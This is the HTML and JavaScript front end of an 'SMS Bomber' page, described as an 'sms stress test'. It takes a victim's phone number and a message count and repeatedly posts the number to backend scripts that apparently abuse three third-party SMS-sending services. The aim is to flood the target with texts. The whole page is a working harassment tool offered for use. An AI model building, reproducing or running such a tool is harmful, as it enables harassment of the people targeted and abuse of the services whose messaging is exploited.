<html>
<title>SMS Bomber</title>
<link href="https://fonts.googleapis.com/css?family=Cutive+Mono" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Titillium+Web" rel="stylesheet">
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
<script src="http://code.jquery.com/ui/1.10.3/jquery-ui.js"></script>
<script>
function doshit() {
var num = document.getElementById('phonenumber').value;
var api = document.getElementById('api').value;
var current = 0;
var total = document.getElementById('damage').value;
ajax();
        function ajax(){
            if(current < total) {
                $("#content").css("height","200px");
                var http = new XMLHttpRequest();
                if (api == "FreeBasics") {
                    var postapi = "do1.php"
                }
                else if (api == "McDO") {
                    var postapi = "do2.php"
                }
                else if (api == "uHop") {
                    var postapi = "do3.php"
                }
                else {
                    var listapis = ["do1.php", "do2.php", "do3.php"]
                    var postapi = listapis[Math.floor(Math.random() * listapis.length)];
                }
				http.open("POST", postapi, true);
                http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
				http.send("fonnum=" + num);
				current++;
                document.getElementById("wrapper").innerHTML = '<div style="margin-top: 20px;"><font style="text-align: center;">Sending love using method <font style="color: lightblue;">' + api + '</font>.... ::  ' + current + ' / ' + total +'</div>';
                http.onreadystatechange=function() {
                    if (http.readyState == 4) {
                        ajax();
                    }
                }
			}
			else{
                $("#content").css("height","auto");
                document.getElementById("wrapper").innerHTML = "";
			}
		}
	}
</script>
<style>
body {
    font-family: 'Titillium Web';
    background-color: #061f11;
    background-image:linear-gradient(#434343, #282828);
    background-image:       linear-gradient(0deg, transparent 24%, rgba(255, 255, 255, .05) 25%, rgba(255, 255, 255, .05) 26%, transparent 27%, transparent 74%, rgba(255, 255, 255, .05) 75%, rgba(255, 255, 255, .05) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(255, 255, 255, .05) 25%, rgba(255, 255, 255, .05) 26%, transparent 27%, transparent 74%, rgba(255, 255, 255, .05) 75%, rgba(255, 255, 255, .05) 76%, transparent 77%, transparent);
    background-size:50px 50px;
}

#title {
	display: flex;
}

#content {
    color: #c3c3c3;
    left: 0;
    right: 0;
    margin: 30px auto 30px auto;
    background-color: #257b33;
    width: 50%;
    transition: height 2s;
}
#header {
    padding: 25px 25px 25px 25px;
}

</style>
<body>
<div id="content">
        <div id="header">
            <div id="title"><h1>UwU|</h1>&nbsp;<p>sms stress test.</p></div>
            <label>API </label>
            <select id="api">
                <option value="FreeBasics">API 1</option>
                <option value="McDO">API 2</option>
                <option value="uHop">API 3</option>
                <option value="Random">Random</option>
            </select>
            <label>Phone</label>&nbsp;<input maxlength="11" id="phonenumber">
            <label>Count</label>&nbsp;<input id="damage" maxlength="4">
            <input onclick="doshit();" class="signupbtn" value="Smash" type="submit">
            <div id="wrapper">
            </div>
        </div>
    </div>
</div>
</body>
</html>